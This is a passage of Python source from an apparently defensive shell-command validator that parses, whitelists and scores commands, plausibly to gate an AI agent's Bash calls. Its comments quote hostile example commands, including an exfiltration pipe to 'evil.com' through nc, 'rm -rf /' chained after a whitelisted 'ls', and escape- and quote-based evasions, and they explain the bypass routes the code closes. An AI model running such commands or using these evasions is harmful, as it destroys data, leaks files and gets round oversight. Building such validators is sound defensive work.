            # a blocked segment). A weaker substitution verdict returned here therefore DOWNGRADED
            # commands those passes deny outright. Consulting match_command() from here does not
            # fix it: that helper is whitelist-gated, so a whitelisted first word makes it report
            # SAFE for the whole command. Only a genuine BLOCKED verdict short-circuits; anything
            # weaker is handed to the caller, which joins it against the completed verdict.
            for sub_result in sub_results:
                if sub_result.allowed:
                    continue  # Don't cache (substitution content may vary)
                if sub_result.risk_level == RiskLevel.BLOCKED:
                    return _substitution_denial(sub_result)
                if _deferred is not None and (not _deferred or sub_result.risk_level > _deferred[-1].risk_level):
                    _deferred[:] = [sub_result]

            # SECURITY: Pure AST-based dangerous command detection
            # Uses bashlex AST for BOTH command names AND arguments (no regex shortcuts)
            # This catches quoted command names that bypass regex patterns (e.g., "nc" -e)
            # Must run AFTER parsing but BEFORE regex matching for defense in depth
            commands_with_args = parser.extract_commands_with_args(ast)
            dangerous_check = _check_dangerous_command_flags(commands_with_args)
            if dangerous_check is not None:
                return dangerous_check

            # LAB-2768: here-strings (`bash <<< PROG`) execute PROG the same way `bash -c PROG`
            # does, but the payload rides a redirect node the extractor above skips. Surface it
            # here; only SHELL here-strings are re-validated as bash (a python/perl here-string is
            # not bash and would be nonsense to re-check). Fed into the Step 5c re-entry below.
            herestring_payloads = list(
                dict.fromkeys(
                    prog
                    for name, prog in parser.extract_stdin_program_redirects(ast)
                    if name in _SHELL_COMMANDS and prog.strip()
                )
            )

        except (ParseError, ValueError) as e:
            # Check if this is a heredoc parse failure (bashlex doesn't support quoted delimiters)
            # e.g., python3 << 'EOF' ... EOF
            if "<<" in command and ("here-document" in str(e) or "heredoc" in str(e).lower()):
                # Extract command before heredoc and validate that instead
                heredoc_result = _validate_heredoc_command(command, config_path, _derived=_depth > 0 or _derived)
                if heredoc_result is not None:
                    return heredoc_result
            # Fall through to block if heredoc handling didn't work
            return ValidationResult(
                allowed=False,
                risk_level=RiskLevel.BLOCKED,
                message=f"Parse error: {e}",
                alternatives=[],
                exit_code=1,
                error=str(e),
            )
            # Don't cache parse errors (might be fixable)

        # Step 5: Load rules and match with AST context
        try:
            engine = _get_rule_engine(config_path)

            # SECURITY CRITICAL: Extract and validate each command segment independently
            # This prevents bypass via piping/chaining dangerous commands after whitelisted ones
            # e.g., "ls | rm -rf /" should NOT be allowed just because "ls" is whitelisted
            # Literal ranges come from the SAME parse — see the method's docstring
            # for why the per-segment re-parse had to go (spec §3.2 parse-once).
            segments = parser.extract_command_segments_with_literals(command, ast)

            # Track all matched rules for audit logging (used when multiple segments)
            all_matched_rules = []

            # If we have multiple segments, validate each one
            if len(segments) > 1:
                # Full-command whitelist check before segment validation.
                # Per-segment validation cannot detect safe multi-command patterns
                # (e.g., "gh auth token | docker login ... --password-stdin") because
                # each segment is evaluated in isolation. Whitelisting the full command
                # here allows specific safe pipe patterns without whitelisting the
                # constituent commands standalone.
                #
                # SECURITY CRITICAL: the pattern must span the WHOLE command, not just
                # its prefix (is_fully_whitelisted, not is_whitelisted). A prefix match
                # would let the whitelisted "ls" in "ls; rm -rf /" vouch for every later
                # segment and skip the loop below entirely.
                if engine.is_fully_whitelisted(command):
                    result = ValidationResult(
                        allowed=True,
                        risk_level=RiskLevel.SAFE,
                        message="Command is whitelisted",
                        alternatives=[],
                        exit_code=0,
                        error=None,
                        matched_rules=[],
                    )
                    if _depth == 0 and _shellcheck and not _deferred:
                        _global_cache.set(command, result)
                    return result

                highest_risk = RiskLevel.SAFE
                highest_match = None

                for segment in segments:
                    # Parse-once (spec §3.2): no per-segment re-parse. Every input
                    # the matcher needs is derived from `ast` - the literal and
                    # heredoc ranges by _rebase, the reconstruction from the
                    # segment's own node, whose word spans still index `command`
                    # and so are read against it via quote_source. There is no
                    # segment parse left to fail, which is why the fail-closed
                    # branch that stood in for one is gone rather than dropped.
                    seg_match = _match_original_and_reconstructed(
                        engine,
                        parser,
                        segment.text,
                        [segment.node],
                        string_literals=segment.string_literals,
                        heredoc_ranges=segment.heredoc_ranges,
                        quote_source=command,
                    )

                    if seg_match.matched and seg_match.rule:
                        all_matched_rules.append(seg_match.rule.name)

                    # Track highest risk across all segments
                    if seg_match.risk_level > highest_risk:
                        highest_risk = seg_match.risk_level
                        highest_match = seg_match

                # Use highest risk found, or SAFE if none
                if highest_match:
                    match = RuleMatch(
                        matched=True,
                        rule=highest_match.rule,
                        risk_level=highest_risk,
                        message=highest_match.message,
                        alternatives=highest_match.alternatives,
                    )
                else:
                    # No single segment matched a rule; re-check the whole command so
                    # cross-segment rules (e.g. "tar ... | nc ...") still fire.
                    # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
                    # already settled above by is_fully_whitelisted(). match_command()'s
                    # own whitelist check is prefix-based, and honouring it here would let
                    # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
                    match = engine.match_command(command, string_literals=string_literals, use_whitelist=False)
                    all_matched_rules = []
            else:
                # Single segment - validate both original and reconstructed command
                # SECURITY: Bashlex unescapes characters (e.g., 'rm\ -rf\ /' → 'rm -rf /')
                # We must match against both to catch escape-based evasion attempts
                match = _match_original_and_reconstructed(
                    engine,
                    parser,
                    command,
                    ast,
                    string_literals=string_literals,
                    quote_source=command,
                    heredoc_ranges=heredoc_ranges,
                )
        except ConfigurationError as e:
            return ValidationResult(
                allowed=False,
                risk_level=RiskLevel.BLOCKED,
                message=f"Configuration error: {e}",
                alternatives=[],
                exit_code=1,
                error=str(e),
            )
            # Don't cache config errors

        # Step 5b: Contextual HIGH-risk commands (find -exec*/-delete, kubectl state-changing).
        # Top-level parity with SubstitutionValidator (which BLOCKs these in $()); at the top level
        # they are common legitimate ops, so elevate to HIGH (ask) and let the preset decide rather
        # than hard-blocking. Only elevate when nothing already matched at >= HIGH. See #97.
        if match.risk_level < RiskLevel.HIGH:
            contextual = _check_contextual_high_risk(commands_with_args)
            if contextual is not None:
                ctx_name, ctx_reason = contextual
                ctx_alternatives = [
                    "Review exactly what will run or be modified before executing",
                    "Use a read-only form (e.g. find without -exec/-delete, kubectl get/describe)",
                ]
                match = RuleMatch(
                    matched=True,
                    rule=SecurityRule(
                        name=f"ast_contextual_high:{ctx_name}",
                        description=ctx_reason,
                        risk_level=RiskLevel.HIGH,
                        patterns=[],
                        alternatives=ctx_alternatives,
                    ),
                    risk_level=RiskLevel.HIGH,
                    message=ctx_reason,
                    alternatives=ctx_alternatives,
                )

        # Step 5c: shell-delegated payloads (LAB-2754).
        # `bash -c PROG` / `watch PROG` execute PROG. Re-enter validation on it and take the
        # higher verdict, so no spelling of the wrapper scores below the bare payload.
        # NOT a general guarantee: this runs after the multi-segment whitelist, so a full-span
        # whitelist match still short-circuits it (#146 closed the prefix case). Deliberately NOT routed through
        # SubstitutionValidator - that one is whitelist-first default-DENY, and re-entering the
        # top-level entry point here keeps `bash -c "git push --force"` at HIGH rather than
        # BLOCKED.
        # `-c`/wrapper/`watch` payloads plus here-string (`<<<`) payloads (LAB-2768); a here-string
        # re-enters validation identically to a `-c` payload, so `bash <<< "$CMD"` matches
        # `bash -c "$CMD"` rather than fail-closing one spelling of the same delegation. Every
        # payload below re-enters validation - and ShellCheck - once, so here-strings share the
        # extractor's ceiling: without it n distinct `<<<` cost n unbounded re-entries while the
        # `-c` spelling of the same command stopped at MAX_DELEGATOR_TOKENS, and a hook that
        # outlives its timeout fails OPEN. Identical payloads collapse first, whichever spelling
        # surfaced them.
        payloads: list[str] = []
        if match.risk_level < RiskLevel.BLOCKED:
            if len(herestring_payloads) > MAX_DELEGATOR_TOKENS:
                raise ValueError(f"Here-string re-validation exceeded {MAX_DELEGATOR_TOKENS} distinct payloads")
            payloads = list(dict.fromkeys(_shell_delegated_payloads(commands_with_args) + herestring_payloads))
        for payload in payloads:
            if _depth >= MAX_SHELL_DELEGATION_DEPTH:
                # Fail closed. Reached by chaining `watch`, not by nesting `bash -c`:
                # shell quoting collapses before the payload can nest this far.
                inner = ValidationResult(
                    allowed=False,
                    risk_level=RiskLevel.BLOCKED,
                    message=f"Shell delegation nested deeper than {MAX_SHELL_DELEGATION_DEPTH} levels",
                    alternatives=["Run the command directly instead of nesting shell -c"],
                    exit_code=1,
                    error=None,
                )
            else:
                inner = validate_command(payload, config_path, _depth=_depth + 1)
            if inner.risk_level > match.risk_level:
                match = RuleMatch(
                    matched=True,
                    rule=SecurityRule(
                        name="shell_delegated_payload",
                        description="Argument executed as shell code by the invoking command",
                        risk_level=inner.risk_level,
                        patterns=[],
                        alternatives=inner.alternatives,
                    ),
                    risk_level=inner.risk_level,
                    message=f"Shell-delegated payload {payload!r}: {inner.message}",
                    alternatives=inner.alternatives,
                )
            if match.risk_level == RiskLevel.BLOCKED:
                break

        # Step 6: ShellCheck integration (if available)
        # ShellCheck can catch issues our regex patterns miss, like $'' expansions
        # SC2114: "Warning: deletes a system directory" catches rm -r$''f /
        shellcheck_elevated = False
        security_findings: list = []  # Initialize for type checker
        if _shellcheck and is_shellcheck_available() and match.risk_level < RiskLevel.BLOCKED:
            findings = run_shellcheck(command)
            if findings is None and _depth > 0:
                # A payload re-entered from Step 5c (`bash -c "…"`) gets its only ShellCheck
                # here - no outer spawn reads inside a `-c` string - so a run with no verdict
                # is refused, as the heredoc spawn refuses it (LAB-4586). At depth 0 the same
                # None is still read as clean: whether the top-level pass should fail closed
                # is LAB-4362's open question, not decided here.
                shellcheck_elevated = True
                alternatives = ["Shorten the delegated payload or run it as its own Bash call"]
                match = RuleMatch(
                    matched=True,
                    rule=SecurityRule(
                        name="shellcheck:incomplete",
                        description="ShellCheck gave no verdict on a shell-delegated payload",
                        risk_level=RiskLevel.BLOCKED,
                        patterns=[],
                        alternatives=alternatives,
                    ),
                    risk_level=RiskLevel.BLOCKED,
                    message="ShellCheck did not complete, so the payload is unchecked",
                    alternatives=alternatives,
                )
            security_findings = get_security_findings(findings or [])
            if security_findings:
                # Elevate to BLOCKED if ShellCheck found security issues
                shellcheck_elevated = True
                # If our regex patterns matched, use that rule; otherwise create synthetic
                shellcheck_rule = match.rule or SecurityRule(
                    name=f"shellcheck_{security_findings[0].code}",
                    description=f"ShellCheck {security_findings[0].sc_code}: {security_findings[0].message}",
                    risk_level=RiskLevel.BLOCKED,
                    patterns=[],
                    alternatives=[f"See {security_findings[0].wiki_url}"],
                )
                match = RuleMatch(
                    matched=True,
                    rule=shellcheck_rule,
                    risk_level=RiskLevel.BLOCKED,
                    message=f"ShellCheck: {security_findings[0].message}",
                    alternatives=[f"See {security_findings[0].wiki_url}"],
                )

        # Step 7: Build ValidationResult
        # BLOCKED commands are not allowed
        allowed = match.risk_level != RiskLevel.BLOCKED
        exit_code = 0 if allowed else 1

        # Extract matched rule names for audit logging
        # When multiple segments matched, use all_matched_rules; otherwise use the single match
        matched_rules = all_matched_rules or ([match.rule.name] if match.matched and match.rule else [])
        if shellcheck_elevated and security_findings:
            matched_rules.append(f"shellcheck:{security_findings[0].sc_code}")

        result = ValidationResult(
            allowed=allowed,
            risk_level=match.risk_level,
            message=match.message,
            alternatives=match.alternatives,
            exit_code=exit_code,
            error=None,
            matched_rules=matched_rules,
        )

        # Step 7: Cache successful validation.
        # Never at depth > 0: the shell-delegation depth cap makes a verdict depend on nesting
        # level, and the cache is keyed on the command string alone. Caching a capped inner
        # verdict flipped `watch watch watch watch ls` from SAFE to BLOCKED for the rest of the
        # process once a deeper chain had been seen. Never with ShellCheck skipped, for the same
        # reason: that verdict is weaker than the one a fresh call would produce for the key. The
        # Step 5 whitelist write carries the same guard: its verdict matches a fresh one only
        # because Step 5 returns before Step 6, and one uniform rule needs no such proof.
        # Nor when a substitution denial is still owed a join: the cached entry would be the
        # pre-join verdict, and the next identical command would hit it and skip the join.
        if _depth == 0 and _shellcheck and not _deferred:
            _global_cache.set(command, result)

        # Step 8: Return
        return result

    except Exception as e:
        # Catch-all for unexpected errors
        logger.exception(f"Unexpected error validating command: {command!r}")
        return ValidationResult(
            allowed=False,
            risk_level=RiskLevel.BLOCKED,
            message=f"Unexpected validation error: {type(e).__name__}",
            alternatives=[],
            exit_code=1,
            error=str(e),
        )


def clear_caches() -> None:
    """Clear all module-level caches.

    Useful for testing when you need to force rule reloading or
    clear validation results.

    Clears:
        - Validation result cache
        - RuleEngine cache
        - Parser cache
    """
    global _global_rule_engine, _global_rule_engine_path, _global_parser, _global_substitution_validator  # noqa: PLW0603
    global _global_cache_path  # noqa: PLW0603
    _global_cache.clear()
    _global_cache_path = None
    _global_rule_engine = None
    _global_rule_engine_path = None
    _global_parser = None
    _global_substitution_validator = None
